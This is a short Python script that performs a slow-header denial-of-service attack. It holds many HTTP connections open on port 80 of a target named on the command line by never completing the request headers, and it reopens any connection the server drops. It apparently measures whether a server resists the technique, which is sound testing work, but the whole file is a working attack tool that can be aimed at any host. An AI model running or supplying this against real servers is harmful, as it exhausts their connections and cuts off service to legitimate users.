"""Opens many connections that send a request header one line at a time, never finishing."""
import socket, sys, time

target, count, seconds = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
socks = []
def connect():
    s = socket.create_connection((target, 80), timeout=5)
    s.send(b"GET /api/products?page=1 HTTP/1.1\r\nHost: web\r\n")
    return s
for _ in range(count):
    try:
        socks.append(connect())
    except OSError:
        pass
print(f"opened {len(socks)}", flush=True)
end = time.time() + seconds
dropped = 0
while time.time() < end:
    for s in list(socks):
        try:
            s.send(b"X-a: b\r\n")
        except OSError:
            socks.remove(s); dropped += 1
            try:
                socks.append(connect())
            except OSError:
                pass
    time.sleep(3)
print(f"still open {len(socks)}, dropped by server {dropped}", flush=True)
